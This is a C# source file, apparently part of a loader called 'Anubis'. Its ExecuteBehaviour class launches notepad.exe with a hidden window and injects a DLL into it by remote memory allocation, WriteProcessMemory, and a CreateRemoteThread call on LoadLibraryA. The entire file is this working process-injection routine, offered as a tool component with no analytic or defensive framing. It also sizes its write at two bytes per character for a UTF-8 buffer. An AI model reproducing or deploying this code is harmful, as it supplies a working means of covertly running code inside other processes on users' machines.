using Anubis.System;
using Anubis.Win32.Loader.Environment.Statics;

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Anubis.Win32.Loader.Environment.Behaviours
{
    public class ExecuteBehaviour : ExBehaviour
    {
        private Process m_Process;
        private string m_Path;
        public override void Awake()
        {
            ProcessStartInfo info = new ProcessStartInfo
            {
                CreateNoWindow = false,
                FileName = "notepad.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                ErrorDialog = false
            };

            m_Process = Process.Start( info );
        }

        public bool Run(string path)
        {
            m_Path = path;
            IntPtr handle = m_Process.Handle;

            if ( handle == IntPtr.Zero )
            {
                return false;
            }

            var load_library = GetProcedurePointer();
            if ( load_library == IntPtr.Zero )
            {
                return false;
            }

            var allocated = Nt.VirtualAllocEx( handle, IntPtr.Zero, Calculate(), (uint)(Nt.AllocationType.MemoryCommit | Nt.AllocationType.MemoryReserve), (uint)Nt.AllocationProtect.PageReadWrite );
            if ( allocated == IntPtr.Zero )
            {
                return false;
            }

            var result = Nt.WriteProcessMemory( handle, allocated, Encoding.UTF8.GetBytes( m_Path ), Calculate(), out var written );
            if ( result )
            {
                Nt.CreateRemoteThread( handle, IntPtr.Zero, 0, load_library, allocated, 0, IntPtr.Zero );
            }

            return result;
        }

        private IntPtr GetProcedurePointer()
        {
            var module = Nt.GetModuleHandle( "kernel32.dll" );
            if ( module == IntPtr.Zero )
            {
                return IntPtr.Zero;
            }

            return Nt.GetProcAddress( module, "LoadLibraryA" );
        }
        private uint Calculate()
            => ( uint )( ( m_Path.Length + 1 ) * Marshal.SizeOf( typeof( char ) ) );
    }
}
